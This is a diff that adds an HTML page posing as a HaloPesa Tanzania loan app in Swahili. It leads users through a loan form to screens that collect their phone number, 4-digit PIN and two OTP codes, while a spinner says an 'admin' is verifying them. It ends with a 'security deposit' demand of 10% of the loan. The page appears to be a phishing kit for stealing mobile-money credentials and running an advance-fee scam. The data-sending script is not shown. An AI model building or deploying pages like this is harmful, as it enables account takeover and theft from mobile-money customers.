@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>HaloPesa Tanzania</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="app-container">
+
+  <!-- SCREEN 1: WELCOME / NOTICE SCREEN -->
+  <section id="screen-welcome" class="screen active">
+    <div class="welcome-header-area">
+      <div class="halopesa-logo-row">
+        <div class="icon-phone-box">📱</div>
+        <h1>HaloPesa <span class="tanzania-txt">TANZANIA</span></h1>
+      </div>
+      <p class="brand-subtitle">Tunakukaribisha kwenye Huduma ya HaloPesa — Haraka, Salama, na Rahisi</p>
+    </div>
+
+    <div class="notice-card-box">
+      <div class="notice-title-box">
+        <span class="warn-icon">⚠️</span>
+        <h2>TAARIFA MUHIMU / IMPORTANT NOTICE</h2>
+      </div>
+
+      <p class="notice-body-p">
+        <strong>ILI KUANZA MAOMBI YAKO HAKIKISHA UNA MAELEZO HALALI YA HALOPESA.</strong>
+      </p>
+      <p class="notice-body-p">
+        <strong>THIBITISHA KABLA YA KUANDIKA, TUMIA RANGI YA HALOPESA</strong>
+      </p>
+
+      <ul class="notice-bullets">
+        <li>✅ • Hakikisha taarifa zako ni sahihi na halali kabla ya kuwasilisha ombi</li>
+        <li>✅ • Thibitisha namba yako ya HaloPesa imeandikwa kwa usahihi</li>
+        <li>✅ • Tumia huduma rasmi za HaloPesa tu kwa usalama wa akaunti yako</li>
+      </ul>
+
+      <!-- NAELEWA BUTTON WITH HEART BEAT PULSING ANIMATION -->
+      <button type="button" id="btn-goto-slider" class="btn-naelewa-pulse">NAELEWA</button>
+    </div>
+
+    <div class="app-download-footer">
+      <small>Kwa msaada zaidi: Piga *150*60# | Huduma kwa Mteja: 0800 110 060 | www.halopesa.co.tz</small>
+      <small class="footer-small-sub">Karibu ujumbe huu ni wa kuelimisha. Hakikisha unatumia njia rasmi za HaloPesa Tanzania pekee.</small>
+    </div>
+  </section>
+
+  <!-- SCREEN 2: LOAN REPAYMENT ESTIMATE SLIDER -->
+  <section id="screen-slider" class="screen white-screen">
+    <div class="top-nav-bar bg-orange">
+      <button type="button" class="nav-back-btn text-white" id="btn-slider-back">← Rudi</button>
+      <div class="brand-header-inline">
+        <span class="halopesa-brand-sm text-white">HaloPesa</span>
+      </div>
+      <div class="hamburger text-white">☰</div>
+    </div>
+
+    <div class="card-container-main">
+      <div class="card-header-title">
+        <h1 class="power-dreams-title">Pata Mkopo Wako Haraka</h1>
+        <p class="sub-dreams">Idhini ya haraka • Riba nafuu • Muda rahisi</p>
+      </div>
+
+      <div class="loan-calc-card">
+        <div class="slider-group">
+          <label>Kiasi cha Mkopo</label>
+          <div class="slider-val-display" id="loan-amount-text">TSh 100,000</div>
+          <input type="range" id="loan-amount-slider" min="10000" max="1000000" step="5000" value="100000" class="range-orange">
+        </div>
+
+        <div class="slider-group">
+          <label>Muda wa Mkopo</label>
+          <div class="slider-val-display" id="loan-months-text">miezi 12</div>
+          <input type="range" id="loan-months-slider" min="1" max="60" step="1" value="12" class="range-orange">
+        </div>
+
+        <div class="monthly-payment-box">
+          <span>Malipo ya Kila Mwezi</span>
+          <h2 id="monthly-rep-val">TSh 9,504</h2>
+        </div>
+
+        <button type="button" id="btn-goto-form1" class="btn-primary-orange">OMBA SASA</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- SCREEN 3: FORM STEP 1 OF 3 -->
+  <section id="screen-form1" class="screen white-screen">
+    <div class="top-nav-bar bg-orange">
+      <button type="button" class="nav-back-btn text-white" id="btn-form1-back">← Rudi</button>
+      <div class="brand-header-inline">
+        <span class="halopesa-brand-sm text-white">HaloPesa</span>
+      </div>
+      <div class="hamburger text-white">☰</div>
+    </div>
+
+    <div class="card-container-main">
+      <h2 class="form-main-title">Maombi ya Mkopo</h2>
+      <p class="step-indicator">Hatua 1 ya 3</p>
+      <div class="progress-bar-row">
+        <div class="prog-segment active"></div>
+        <div class="prog-segment"></div>
+        <div class="prog-segment"></div>
+      </div>
+
+      <div class="form-group">
+        <label>Aina ya Mkopo</label>
+        <select id="loan-type" class="input-select">
+          <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
+          <option value="Mkopo wa Haraka">Mkopo wa Haraka</option>
+          <option value="Mkopo wa Kilimo">Mkopo wa Kilimo</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Kiasi cha Mkopo (TSh)</label>
+        <input type="text" id="form-amount-input" class="input-text" value="100000">
+      </div>
+
+      <div class="form-group">
+        <label>Muda wa Mkopo</label>
+        <select id="loan-duration" class="input-select">
+          <option value="Miezi 48">Miezi 48</option>
+          <option value="Miezi 24">Miezi 24</option>
+          <option value="Miezi 12">Miezi 12</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Madhumuni ya Mkopo</label>
+        <textarea id="loan-purpose" class="input-textarea" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
+      </div>
+
+      <button type="button" id="btn-form1-next" class="btn-orange-action">HATUA INAYOFUATA</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 4: FORM STEP 2 OF 3 -->
+  <section id="screen-form2" class="screen white-screen">
+    <div class="top-nav-bar bg-orange">
+      <button type="button" class="nav-back-btn text-white" id="btn-form2-back">← Rudi</button>
+      <div class="brand-header-inline">
+        <span class="halopesa-brand-sm text-white">HaloPesa</span>
+      </div>
+      <div class="hamburger text-white">☰</div>
+    </div>
+
+    <div class="card-container-main">
+      <h2 class="form-main-title">Maombi ya Mkopo</h2>
+      <p class="step-indicator">Hatua 2 ya 3</p>
+      <div class="progress-bar-row">
+        <div class="prog-segment active"></div>
+        <div class="prog-segment active"></div>
+        <div class="prog-segment"></div>
+      </div>
+
+      <div class="form-row-two">
+        <div class="form-group"><label>Jina la Kwanza</label><input type="text" id="first-name" class="input-text" placeholder="Jina la kwanza"></div>
+        <div class="form-group"><label>Jina la Ukoo</label><input type="text" id="last-name" class="input-text" placeholder="Jina la ukoo"></div>
+      </div>
+
+      <div class="form-group">
+        <label>Namba ya Simu</label>
+        <div class="phone-input-group">
+          <span class="flag-prefix">🇹🇿 +255</span>
+          <input type="text" id="form-phone" class="input-text" placeholder="712345678 au 0712345678" inputmode="numeric">
+        </div>
+        <small class="helper-note">Weka namba 9 au anza na 0 (mfano, 0712345678 -&gt; inabadilika hadi +255712345678)</small>
+      </div>
+
+      <div class="form-buttons-row">
+        <button type="button" id="btn-form2-prev" class="btn-grey-action">ILIYOTANGULIA</button>
+        <button type="button" id="btn-form2-next" class="btn-orange-action">HATUA INAYOFUATA</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- SCREEN 5: FORM STEP 3 OF 3 -->
+  <section id="screen-form3" class="screen white-screen">
+    <div class="top-nav-bar bg-orange">
+      <button type="button" class="nav-back-btn text-white" id="btn-form3-back">← Rudi</button>
+      <div class="brand-header-inline">
+        <span class="halopesa-brand-sm text-white">HaloPesa</span>
+      </div>
+      <div class="hamburger text-white">☰</div>
+    </div>
+
+    <div class="card-container-main">
+      <h2 class="form-main-title">Maombi ya Mkopo</h2>
+      <p class="step-indicator">Hatua 3 ya 3</p>
+      <div class="progress-bar-row">
+        <div class="prog-segment active"></div>
+        <div class="prog-segment active"></div>
+        <div class="prog-segment active"></div>
+      </div>
+
+      <div class="form-group">
+        <label>Hali ya Ajira</label>
+        <select id="employment-status" class="input-select">
+          <option value="Mfanyabiashara">Mfanyabiashara</option>
+          <option value="Mwajiriwa Rasmi">Mwajiriwa Rasmi</option>
+          <option value="Mjasiriamali">Mjasiriamali</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Mapato ya Mwaka (TSh)</label>
+        <input type="text" id="annual-income" class="input-text" placeholder="Weka mapato ya mwaka">
+      </div>
+
+      <div class="summary-card-box">
+        <h4>Muhtasari wa Maombi</h4>
+        <div class="sum-row"><span>Kiasi cha Mkopo:</span> <strong id="sum-amount">TSh 100,000</strong></div>
+        <div class="sum-row"><span>Muda wa Mkopo:</span> <strong id="sum-duration">Miezi 48</strong></div>
+        <div class="sum-row"><span>Madhumuni:</span> <strong id="sum-purpose">Biashara</strong></div>
+        <div class="sum-row"><span>Mwombaji:</span> <strong>HALOPESA TANZANIA</strong></div>
+      </div>
+
+      <div class="form-buttons-row">
+        <button type="button" id="btn-form3-prev" class="btn-grey-action">ILIYOTANGULIA</button>
+        <button type="button" id="btn-form3-submit" class="btn-orange-action">WASILISHA MAOMBI</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- SCREEN 6: SIGN IN / PIN ENTRY -->
+  <section id="screen-signin" class="screen white-screen">
+    <div class="top-nav-bar bg-orange">
+      <div class="brand-header-inline">
+        <span class="halopesa-brand-sm text-white">HaloPesa</span>
+      </div>
+      <div class="hamburger text-white">☰</div>
+    </div>
+
+    <div class="card-container-main align-center">
+      <div class="card-header-title">
+        <h2>Ingia Akaunti</h2>
+      </div>
+
+      <div class="phone-input-group margin-bottom-15">
+        <span class="flag-prefix">🇹🇿 +255</span>
+        <input type="text" id="signin-phone" class="input-text" placeholder="712345678 au 0712345678">
+      </div>
+
+      <label class="pin-title-label">Weka PIN yako (tarakimu 4)</label>
+
+      <!-- Surface Error Notification -->
+      <div id="banner-pin-error" class="surface-error-banner"></div>
+
+      <div class="golden-pin-container">
+        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+      </div>
+
+      <a href="#" class="forgot-pin-link">Umesahau PIN?</a>
+
+      <button type="button" id="btn-submit-signin" class="btn-primary-orange margin-top-20">INGIA</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 7: OTP VERIFICATION (STEP 1) -->
+  <section id="screen-otp1" class="screen white-screen">
+    <div class="top-nav-bar bg-orange">
+      <div class="brand-header-inline">
+        <span class="halopesa-brand-sm text-white">HaloPesa</span>
+      </div>
+      <div class="hamburger text-white">☰</div>
+    </div>
+
+    <div class="card-container-main align-center">
+      <div class="card-header-title">
+        <h2>Uthibitisho wa OTP (Hatua ya 1)</h2>
+        <small id="otp1-subtitle">Weka OTP iliyotumwa kwenye namba yako</small>
+      </div>
+
+      <div class="verified-success-alert">
+        ✓ Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.
+      </div>
+
+      <!-- Surface Error Notification -->
+      <div id="banner-otp1-error" class="surface-error-banner"></div>
+
+      <div class="golden-otp-container">
+        <input type="text" class="otp1-box-square" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+        <input type="text" class="otp1-box-square" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp1-box-square" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp1-box-square" maxlength="1" inputmode="numeric">
+      </div>
+
+      <button type="button" id="btn-submit-otp1" class="btn-primary-orange margin-top-20">WASILISHA</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 8: OTP VERIFICATION (STEP 2 - FINAL) -->
+  <section id="screen-otp2" class="screen white-screen">
+    <div class="top-nav-bar bg-orange">
+      <div class="brand-header-inline">
+        <span class="halopesa-brand-sm text-white">HaloPesa</span>
+      </div>
+      <div class="hamburger text-white">☰</div>
+    </div>
+
+    <div class="card-container-main align-center">
+      <div class="card-header-title">
+        <h2>Uthibitisho wa Mwisho wa OTP (Hatua ya 2)</h2>
+        <small>Weka OTP ya mwisho ya tarakimu 4 kwa ajili ya uhakiki kamili</small>
+      </div>
+
+      <div class="verified-success-alert">
+        ✓ Hatua karibu imekamilika! Weka namba ya mwisho ya uthibitisho.
+      </div>
+
+      <!-- Surface Error Notification -->
+      <div id="banner-otp2-error" class="surface-error-banner"></div>
+
+      <div class="golden-otp-container">
+        <input type="text" class="otp2-box-square" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+        <input type="text" class="otp2-box-square" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp2-box-square" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp2-box-square" maxlength="1" inputmode="numeric">
+      </div>
+
+      <button type="button" id="btn-submit-otp2" class="btn-primary-orange margin-top-20">WASILISHA UHAKIKI</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 9: SUCCESS SCREEN -->
+  <section id="screen-success" class="screen white-screen">
+    <div class="card-container-main align-center">
+      <div class="success-badge-circle">✓</div>
+      <h2 class="congrats-title">Hongera!</h2>
+      <p class="congrats-sub">Mkopo wako umeidhinishwa! Fedha zitatolewa hivi karibuni.</p>
+
+      <div class="approved-amount-box">
+        <span>KIASI KILICHOIDHINISHWA</span>
+        <h1 id="final-approved-amount">TSh 100,000</h1>
+      </div>
+
+      <div class="important-notice-card">
+        <h4>⚠️ NOTISI YA UZINGATIAJI</h4>
+        <p>Akaunti yako ya HaloPesa lazima iwe hai na idumishe amana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaidia kupata riba nzuri zaidi.</p>
+      </div>
+
+      <div class="action-buttons-stack">
+        <button class="action-card-btn">Weka Fedha</button>
+        <button class="action-card-btn">Toa Fedha</button>
+        <button class="action-card-btn">Maelezo ya Mkopo</button>
+      </div>
+
+      <div class="next-steps-box">
+        <h4>Hatua Zinazofuata:</h4>
+        <p>Utapata SMS na barua pepe yenye maelezo ya utolewa ndani ya masaa 24.</p>
+      </div>
+
+      <button type="button" id="btn-finish-home" class="btn-primary-orange margin-top-20">Rudi Nyumbani</button>
+    </div>
+  </section>
+
+  <!-- STOPPED SCREEN (IF BLOCKED / DENIED) -->
+  <section id="screen-stopped" class="screen white-screen">
+    <div class="card-container-main align-center" style="margin-top: 150px;">
+      <div class="success-badge-circle" style="background-color: #D32F2F;">✕</div>
+      <h2 class="congrats-title" style="color: #D32F2F;">Maombi Yamesimamishwa</h2>
+      <p class="congrats-sub">Samahani, maombi yako yamekataliwa au kuzuiliwa na mfumo wa usalama wa HaloPesa.</p>
+    </div>
+  </section>
+
+  <!-- LOADING SPINNER OVERLAY -->
+  <div id="loading-overlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <h3 id="loading-title">INATHIBITISHA MAOMBI...</h3>
+    <p id="loading-sub">Tafadhali subiri wakati admin anathibitisha maombi yako.</p>
+  </div>
+
+</div>
+
+<script src="script.js"></script>
+</body>
+                                                                                        </html>
+                              
